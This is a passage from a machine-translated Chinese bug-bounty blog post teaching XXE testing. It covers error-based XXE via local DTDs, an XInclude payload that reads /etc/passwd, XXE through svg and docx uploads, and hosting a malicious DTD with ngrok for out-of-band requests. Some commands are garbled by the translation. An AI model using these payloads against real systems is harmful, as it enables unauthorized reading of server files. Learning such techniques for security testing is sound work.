translated">DTD文件被加载到已经存在的local_dtd变量中。</li><li id="ffc0" class="nu nv iq jp b jq od ju oe jy of kc og kg oh kk nz oa ob oc bi translated">我们从这个DTD中挑选一个名为custom_entity的实体</li><li id="cbb7" class="nu nv iq jp b jq od ju oe jy of kc og kg oh kk nz oa ob oc bi translated">我们通过在custom_entity中动态创建另一个实体来加载/etc/passwd的内容，从而更改了这个custom _ entity的内容。</li><li id="c8ca" class="nu nv iq jp b jq od ju oe jy of kc og kg oh kk nz oa ob oc bi translated">另一个实体是在其中创建另一个名为error的实体来导致错误。</li></ol><p id="4a88" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一切都是HTML编码的，因为它们都在custom_entity的定义中。你可以注意到custom_entity中的实体与我们在前面的XXE中写的错误消息相似。不同的是，它都是一个自定义实体和HTML编码的定义。</p><h1 id="5e77" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">寻找XXEs的一些有趣的地方:</h1><h1 id="6bb5" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">XInclude攻击:</h1><p id="af35" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这种攻击的概念很简单，如果应用程序不使用XML将数据从客户端传输到服务器会怎样。所以你不能写ant DTD，盲xxe也是不可能的。因为在这里您根本无法控制XML。</p><p id="cfaa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是如果服务器在后端处理用户在SOAP请求中提供的数据呢？SOAP请求也使用XML并解析XML实体。</p><p id="8695" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，我们可以使用XInclude，它用于从其他较小的独立XML文档构建大型XML文档。</p><p id="b06d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们可以提供一个xml形式的输入，它将在后端被解析为XML。</p><p id="3c21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当然，你无法知道哪个参数是真实的，所以你必须测试哪个参数是易受攻击的，并反馈回答案。</p><p id="02e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;<br/> &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;</code></p><h1 id="a31b" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">XXE通过文件上传进行攻击:</h1><p id="80fa" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">请留意应用程序接受哪些文件类型，以及它是否会被滥用于xxe。像docx，xlsx表，ppts他们也使用xml。</p><p id="508c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果应用程序接受png和jpg文件，它也可能接受scg文件。</p><p id="da07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过svg文件查找xxe。做Portswigger实验。</p><p id="08da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> XXE按内容类型:</strong></p><p id="f18a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这更像是测试应用程序是否接受xml和文档，如果接受，那么继续对应用程序进行xxe测试。</p><p id="eae9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您还记得STOK是如何将内容类型更改为text/xml并由应用程序对其进行解析的，这意味着它是检查xxe的继续标志。</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="oi kt l"/></div></figure><p id="4eff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，如果你像我一样，没有VPS，并想在真正的应用程序上测试带外请求，并通过在你的服务器上托管恶意dtd。我可能会给你留些东西:</p><ol class=""><li id="c2ea" class="nu nv iq jp b jq jr ju jv jy nw kc nx kg ny kk nz oa ob oc bi translated">在您的系统上安装ngrok。</li></ol><p id="1c1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">&gt;要利用带外请求，您需要的是公共可访问的ip，为此我们将使用ngrok。</p><p id="d504" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.将dtd文件更新到本地机器上</p><p id="3a75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">&gt;它类似于python simplehttpserver 80什么的，但是不要写这些。</p><p id="3a10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">&gt;只需安装updog和</p><blockquote class="ls lt lu"><p id="64eb" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">pip3安装更新</p></blockquote><p id="1439" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据您的需要编写一个恶意的DTD，然后通过输入</p><blockquote class="ls lt lu"><p id="41a3" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">更新日志</p></blockquote><p id="8649" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">updog的默认ip是9090，您可以将其更改为任何端口。</p><p id="11bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，当我们托管我们的DTD文件时，我们需要使它可以公开访问。</p><blockquote class="ls lt lu"><p id="5a67" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">ngrok http 9090</p></blockquote><p id="c12a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它将为您创建一个唯一的URL，该URL可从互联网上公开访问，并且在加载时会解析到您的本地服务器和端口9090。</p><p id="0228" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只要用你的ngrok url写恶意的DTD，用updog把它托管回同一个端口9090。如果你得到一个错误的地址已经被使用。只需强制终止该进程，并在9090/或您选择的任何端口上使用updog重新启动它。</p><p id="1480" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果HTTP请求被阻止，它仍然不能解决用DNS查找检测XXE的问题。在这种情况下，VPS是必须的，对此我们无能为力。</p><p id="9853" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘿，但是您现在已经完全准备好测试XXE与外部实体，以及盲xxe与带外请求或基于错误的xxe或Xinclude xxe或文件上传xxe。</p><p id="4561" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你能从这篇博客中学到一些东西，你不可能一天就掌握它，所以把它作为一个指南，投入至少一周的时间来学习它。反复阅读博客，解决所有XXE实验室，谷歌你不懂的东西。你仍然认为这不清楚，只是在推特上平我，我会帮助你。<a class="ae kl" href="https://twitter.com/Avinashkroy" rel="noopener ugc nofollow" target="_blank"><em class="km">@ avinashkroy</em>T3<em class="km">。</em></a></p><p id="3d6e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">学了xxe之后，该找节目了。阅读披露的报告，看看别人在哪里，他们是如何发现XXE哪些功能是易受攻击的。祝你好运，你祝我好运:)。从明天开始，我们要在真正的目标上寻找XXE。如果我发现了什么漏洞，我会告诉你们的。</p><p id="85f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">谢谢，黑客快乐！&amp;注意安全！</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="oj kt l"/></div></figure></div></div>    
</body>
</html>